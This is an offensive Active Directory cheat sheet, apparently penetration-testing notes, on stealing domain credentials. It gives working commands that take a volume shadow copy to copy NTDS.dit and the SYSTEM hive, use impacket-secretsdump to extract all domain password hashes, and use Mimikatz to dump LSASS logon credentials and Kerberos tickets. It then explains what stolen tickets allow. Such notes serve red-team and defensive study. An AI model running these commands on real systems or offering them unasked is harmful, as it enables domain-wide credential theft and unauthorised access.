# Shadow Copies (NTDS.dit Extraction)

Requires Domain Admin access on the DC.

```cmd
# Create shadow copy of C:
vshadow.exe -nw -p C:

# Copy NTDS.dit from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Save SYSTEM hive
reg.exe save hklm\system c:\system.bak
```

```bash
# Extract all hashes offline on Kali
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## Cached Credentials from LSASS

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # dumps all creds including domain users

# Grab cached Kerberos tickets
mimikatz # sekurlsa::tickets
```

> Stealing a TGT allows requesting TGS tickets for any service. Stealing a TGS gives access only to that specific service.
